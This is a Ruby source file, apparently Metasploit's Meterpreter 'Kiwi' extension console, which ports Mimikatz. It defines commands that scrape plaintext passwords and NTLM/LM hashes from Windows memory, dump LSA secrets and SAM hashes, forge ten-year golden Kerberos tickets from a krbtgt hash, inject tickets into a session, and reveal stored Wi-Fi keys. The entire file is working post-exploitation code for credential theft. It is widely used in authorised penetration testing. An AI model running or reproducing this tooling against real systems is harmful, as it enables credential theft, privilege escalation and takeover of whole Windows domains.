# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
#
###
class Console::CommandDispatcher::Kiwi

  Klass = Console::CommandDispatcher::Kiwi

  include Console::CommandDispatcher

  #
  # Name for this dispatcher
  #
  def name
    "Kiwi"
  end

  #
  # Initializes an instance of the priv command interaction. This function
  # also outputs a banner which gives proper acknowledgement to the original
  # author of the Mimikatz 2.0 software.
  #
  def initialize(shell)
    super
    print_line
    print_line
    print_line("  .#####.   mimikatz 2.0 alpha (#{client.platform}) release \"Kiwi en C\"")
    print_line(" .## ^ ##.")
    print_line(" ## / \\ ##  /* * *")
    print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
    print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
    print_line("  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */")
    print_line

    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)

      print_line
      print_warning "Loaded x86 Kiwi on an x64 architecture."
    end
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "creds_wdigest"         => "Retrieve WDigest creds",
      "creds_msv"             => "Retrieve LM/NTLM creds (hashes)",
      "creds_livessp"         => "Retrieve LiveSSP creds",
      "creds_ssp"             => "Retrieve SSP creds",
      "creds_tspkg"           => "Retrieve TsPkg creds",
      "creds_kerberos"        => "Retrieve Kerberos creds",
      "creds_all"             => "Retrieve all credentials",
      "golden_ticket_create"  => "Create a golden kerberos ticket",
      "kerberos_ticket_use"   => "Use a kerberos ticket",
      "kerberos_ticket_purge" => "Purge any in-use kerberos tickets",
      "kerberos_ticket_list"  => "List all kerberos tickets",
      "lsa_dump"              => "Dump LSA secrets",
      "wifi_list"             => "List wifi profiles/creds"
    }
  end

  #
  # Invoke the LSA secret dump on thet target.
  #
  def cmd_lsa_dump(*args)
    check_privs

    print_status("Dumping LSA secrets")
    lsa = client.kiwi.lsa_dump

    # the format of this data doesn't really lend itself nicely to
    # use within a table so instead we'll dump in a linear fashion

    print_line("Policy Subsystem : #{lsa[:major]}.#{lsa[:minor]}") if lsa[:major]
    print_line("Domain/Computer  : #{lsa[:compname]}") if lsa[:compname]
    print_line("System Key       : #{to_hex(lsa[:syskey])}")
    print_line("NT5 Key          : #{to_hex(lsa[:nt5key])}")
    print_line
    print_line("NT6 Key Count    : #{lsa[:nt6keys].length}")

    if lsa[:nt6keys].length > 0
      lsa[:nt6keys].to_enum.with_index(1) do |k, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. ID           : #{Rex::Text::to_guid(k[:id])}")
        print_line("#{index}. Value        : #{to_hex(k[:value])}")
      end
    end

    print_line
    print_line("Secret Count     : #{lsa[:secrets].length}")
    if lsa[:secrets].length > 0
      lsa[:secrets].to_enum.with_index(1) do |s, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. Name         : #{s[:name]}")
        print_line("#{index}. Service      : #{s[:service]}") if s[:service]
        print_line("#{index}. NTLM         : #{to_hex(s[:ntlm])}") if s[:ntlm]
        if s[:current] || s[:current_raw]
          current = s[:current] || to_hex(s[:current_raw], ' ')
          print_line("#{index}. Current      : #{current}")
        end
        if s[:old] || s[:old_raw]
          old = s[:old] || to_hex(s[:old_raw], ' ')
          print_line("#{index}. Old          : #{old}")
        end
      end
    end

    print_line
    print_line("SAM Key Count    : #{lsa[:samkeys].length}")
    if lsa[:samkeys].length > 0
      lsa[:samkeys].to_enum.with_index(1) do |s, i|
        print_line
        index = i.to_s.rjust(2, ' ')
        print_line("#{index}. RID          : #{s[:rid]}")
        print_line("#{index}. User         : #{s[:user]}")
        print_line("#{index}. LM Hash      : #{to_hex(s[:lm_hash])}")
        print_line("#{index}. NTLM Hash    : #{to_hex(s[:ntlm_hash])}")
      end
    end

    print_line
  end

  #
  # Valid options for the golden ticket creation functionality.
  #
  @@golden_ticket_create_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-u" => [ true,  "Name of the user to create the ticket for" ],
    "-i" => [ true,  "ID of the user to associate the ticket with" ],
    "-g" => [ true,  "Comma-separated list of group identifiers to include (eg: 501,502)" ],
    "-d" => [ true,  "Name of the target domain (FQDN)" ],
    "-k" => [ true,  "krbtgt domain user NTLM hash" ],
    "-t" => [ true,  "Local path of the file to store the ticket in" ],
    "-s" => [ true,  "SID of the domain" ]
  )

  #
  # Output the usage for the ticket listing functionality.
  #
  def golden_ticket_create_usage
    print(
      "\nUsage: golden_ticket_create [-h] -u <user> -d <domain> -k <krbtgt_ntlm> -s <sid> -t <path> [-i <id>] [-g <groups>]\n\n" +
      "Create a golden kerberos ticket that expires in 10 years time.\n\n" +
      @@golden_ticket_create_opts.usage)
  end

  #
  # Invoke the golden kerberos ticket creation functionality on the target.
  #
  def cmd_golden_ticket_create(*args)
    if args.include?("-h")
      golden_ticket_create_usage
      return
    end

    user = nil
    domain = nil
    sid = nil
    tgt = nil
    target = nil
    id = 0
    group_ids = []

    @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
      case opt
      when "-u"
        user = val
      when "-d"
        domain = val
      when "-k"
        tgt = val
      when "-t"
        target = val
      when "-i"
        id = val.to_i
      when "-g"
        group_ids = val.split(',').map { |g| g.to_i }.to_a
      when "-s"
        sid = val
      end
    }

    # all parameters are required
    unless user && domain && sid && tgt && target
      golden_ticket_create_usage
      return
    end

    ticket = client.kiwi.golden_ticket_create(user, domain, sid, tgt, id, group_ids)

    ::File.open( target, 'wb' ) do |f|
      f.write ticket
    end

    print_good("Golden Kerberos ticket written to #{target}")
  end

  #
  # Valid options for the ticket listing functionality.
  #
  @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help banner" ],
    "-e" => [ false, "Export Kerberos tickets to disk" ],
    "-p" => [ true,  "Path to export Kerberos tickets to" ]
  )

  #
  # Output the usage for the ticket listing functionality.
  #
  def kerberos_ticket_list_usage
    print(
      "\nUsage: kerberos_ticket_list [-h] [-e <true|false>] [-p <path>]\n\n" +
      "List all the available Kerberos tickets.\n\n" +
      @@kerberos_ticket_list_opts.usage)
  end

  #
  # Invoke the kerberos ticket listing functionality on the target machine.
  #
  def cmd_kerberos_ticket_list(*args)
    if args.include?("-h")
      kerberos_ticket_list_usage
      return
    end

    # default to not exporting
    export = false
    # default to the current folder for dumping tickets
    export_path = "."

    @@kerberos_ticket_list_opts.parse(args) { |opt, idx, val|
      case opt
      when "-e"
        export = true
      when "-p"
        export_path = val
      end
    }

    tickets = client.kiwi.kerberos_ticket_list(export)

    fields = ['Server', 'Client', 'Start', 'End', 'Max Renew', 'Flags']
    fields << 'Export Path' if export

    table = Rex::Ui::Text::Table.new(
      'Header'    => "Kerberos Tickets",
      'Indent'    => 0,
      'SortIndex' => 0,
      'Columns'   => fields
    )

    tickets.each do |t|
      flag_list = client.kiwi.to_kerberos_flag_list(t[:flags]).join(", ")
      values = [
        "#{t[:server]} @ #{t[:server_realm]}",
        "#{t[:client]} @ #{t[:client_realm]}",
        t[:start],
        t[:end],
        t[:max_renew],
        "#{t[:flags].to_s(16).rjust(8, '0')} (#{flag_list})"
      ]

      # write out each ticket to disk if export is enabled.
      if export
        path = "<no data retrieved>"
        if t[:raw]
          id = "#{values[0]}-#{values[1]}".gsub(/[\\\/\$ ]/, '-')
          file = "kerb-#{id}-#{Rex::Text.rand_text_alpha(8)}.tkt"
          path = ::File.expand_path(File.join(export_path, file))
          ::File.open(path, 'wb') do |x|
            x.write t[:raw]
          end
        end
        values << path
      end

      table << values
    end

    print_line
    print_line(table.to_s)
    print_line("Total Tickets : #{tickets.length}")
  end

  #
  # Invoke the kerberos ticket purging functionality on the target machine.
  #
  def cmd_kerberos_ticket_purge(*args)
    client.kiwi.kerberos_ticket_purge
    print_good("Kerberos tickets purged")
  end

  #
  # Use a locally stored Kerberos ticket in the current session.
  #
  def cmd_kerberos_ticket_use(*args)
    if args.length != 1
      print_line("Usage: kerberos_ticket_use ticketpath")
      return
    end

    target = args[0]
    ticket  = ''
    ::File.open(target, 'rb') do |f|
      ticket += f.read(f.stat.size)
    end

    print_status("Using Kerberos ticket stored in #{target}, #{ticket.length} bytes")
    client.kiwi.kerberos_ticket_use(ticket)
    print_good("Kerberos ticket applied successfully")
  end

  def wifi_list_usage
    print(
      "\nUsage: wifi_list\n\n" +
      "List WiFi interfaces, profiles and passwords.\n\n")
  end

  #
  # Dump all the wifi profiles/credentials
  #
  def cmd_wifi_list(*args)
    # if any arguments are specified, then fire up a usage message
    if args.length > 0
      wifi_list_usage
      return
    end

    results = client.kiwi.wifi_list

    if results.length > 0
      results.each do |r|
        table = Rex::Ui::Text::Table.new(
          'Header'    => "#{r[:desc]} - #{r[:guid]}",
          'Indent'    => 0,
          'SortIndex' => 0,
          'Columns'   => [
            'Name', 'Auth', 'Type', 'Shared Key'
          ]
        )

        print_line
        r[:profiles].each do |p|
          table << [p[:name], p[:auth], p[:key_type], p[:shared_key]]
        end

        print_line table.to_s
        print_line "State: #{r[:state]}"
      end
    else
      print_line
      print_error("No wireless profiles found on the target.")
    end

    print_line
    return true
  end

  #
  # Dump all the possible credentials to screen.
  #
  def cmd_creds_all(*args)
    method = Proc.new { client.kiwi.all_pass }
    scrape_passwords("all", method)
  end

  #
  # Dump all wdigest credentials to screen.
  #
  def cmd_creds_wdigest(*args)
    method = Proc.new { client.kiwi.wdigest }
    scrape_passwords("wdigest", method)
  end

  #
  # Dump all msv credentials to screen.
  #
  def cmd_creds_msv(*args)
    method = Proc.new { client.kiwi.msv }
    scrape_passwords("msv", method)
  end

  #
  # Dump all LiveSSP credentials to screen.
  #
  def cmd_creds_livessp(*args)
    method = Proc.new { client.kiwi.livessp }
    scrape_passwords("livessp", method)
  end

  #
  # Dump all SSP credentials to screen.
  #
  def cmd_creds_ssp(*args)
    method = Proc.new { client.kiwi.ssp }
    scrape_passwords("ssp", method)
  end

  #
  # Dump all TSPKG credentials to screen.
  #
  def cmd_creds_tspkg(*args)
    method = Proc.new { client.kiwi.tspkg }
    scrape_passwords("tspkg", method)
  end

  #
  # Dump all Kerberos credentials to screen.
  #
  def cmd_creds_kerberos(*args)
    method = Proc.new { client.kiwi.kerberos }
    scrape_passwords("kerberos", method)
  end

protected

  def check_privs
    if system_check
      print_good("Running as SYSTEM")
    else
      print_warning("Not running as SYSTEM, execution may fail")
    end
  end

  def system_check
    unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
      print_warning("Not currently running as SYSTEM")
      return false
    end

    return true
  end

  #
  # Invoke the password scraping routine on the target.
  #
  # @param provider [String] The name of the type of credentials to dump
  #   (used for display purposes only).
  # @param method [Proc] Block that calls the method that invokes the
  #   appropriate function on the client that returns the results from
  #   Meterpreter that lay in the house that Jack built.
  #
  # @return [void]
  def scrape_passwords(provider, method)
    check_privs
    print_status("Retrieving #{provider} credentials")
    accounts = method.call

    table = Rex::Ui::Text::Table.new(
      'Header'    => "#{provider} credentials",
      'Indent'    => 0,
      'SortIndex' => 0,
      'Columns'   =>
      [
        'Domain', 'User', 'Password', 'Auth Id', 'LM Hash', 'NTLM Hash'
      ]
    )

    accounts.each do |acc|
      table << [
        acc[:domain] || "",
        acc[:username] || "",
        acc[:password] || "",
        "#{acc[:auth_hi]} ; #{acc[:auth_lo]}",
        to_hex(acc[:lm] || ""),
        to_hex(acc[:ntlm] || "")
      ]
    end

    print_line table.to_s
    return true
  end

  #
  # Helper function to convert a potentially blank value to hex and have
  # the outer spaces stripped
  #
  # @param (see Rex::Text.to_hex)
  # @return [String] The result of {Rex::Text.to_hex}, strip'd
  def to_hex(value, sep = '')
    value ||= ""
    Rex::Text.to_hex(value, sep).strip
  end

end

end
end
end
end

